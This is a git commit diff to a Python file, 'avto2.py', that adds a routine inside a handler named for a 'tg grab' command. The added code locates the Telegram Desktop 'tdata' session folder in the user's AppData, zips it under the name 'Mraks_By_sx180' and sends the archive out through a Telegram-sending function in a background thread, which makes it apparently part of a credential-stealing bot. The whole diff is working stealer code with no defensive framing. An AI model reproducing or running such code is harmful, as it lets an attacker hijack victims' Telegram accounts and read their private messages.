850d7ff1ddf14079af70349325a7d8137e695539
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-18 03:32:07 +0300

    Update avto2.py

--- avto2.py
+++ avto2.py
@@ -342,6 +342,26 @@ def create_zip_archive(source_dir, output_zip):
         return None
 
 def handle_tg_grab_command(message):
+    def archive_and_send2():
+        user = os.path.expanduser("~")
+        source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'  # Переместить это сюда
+        if os.path.exists(source_dir):
+            try:
+                temp_dir = os.path.join(os.getcwd(), 'temp')
+                if not os.path.exists(temp_dir):
+                    os.makedirs(temp_dir)  # Создаем папку, если её нет
+                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
+
+                created_zip = create_zip_archive(source_dir, output_zip)  # Передаём аргумент output_zip
+                if created_zip:
+                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
+                else:
+                    print("Failed to create or send zip file.")
+            except Exception as e:
+                print(f"Error creating or sending zip file: {str(e)}")
+        else:
+            print("Папка 'tdata' не найдена.")
+
     thread = threading.Thread(target=archive_and_send2)
     thread.start()
     time.sleep(20)
